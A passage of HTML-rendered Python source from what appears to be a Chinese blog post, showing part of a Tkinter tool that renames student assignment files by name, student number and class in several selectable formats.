data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token string&#34;&gt;&#39;8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;班级姓名：信安20-3张三(名字简写)&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;9&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;姓名：张三&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;学号：20201305999&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;请输入班级：（例 信安20-3）&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					classes &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;e1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;listdir&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token comment&#34;&gt;#pprint(name)  #check&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					temp_excel1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; temp_name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					temp_excel2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; temp_stunum&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					temp_excel3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; temp_fullname&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel3&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;#张三 20201305999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel3&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#张三 + 20201305999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel3&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#张三 - 20201305999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;classes&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel3&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#信安 20-3 张三&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel1&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#张三 (简写) 20201305999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel1&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#张三 (简写)+20201305999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel1&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#张三 (简写)-20201305999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;classes&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel1&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#信安 20-3 张三 (简写)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel3&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#张三&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						 tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#20201305999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;select &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; selfdef &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; selfdef&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;replace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;#123;fname&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;temp_excel3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;replace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;#123;sname&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;temp_excel1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;replace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;#123;num&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;new3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							tnew_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							messagebox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;showinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;警告！&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;自定义为空&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                               &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; temp_file &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;############## 这里选择这种写法是为了水代码行，懒得修改了，见谅 ################&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.zip&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.zip&#34;&lt;/span&gt;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#判断源文件的格式并保留，只写了常用格式&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.jpg&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.jpg&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.jpeg&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 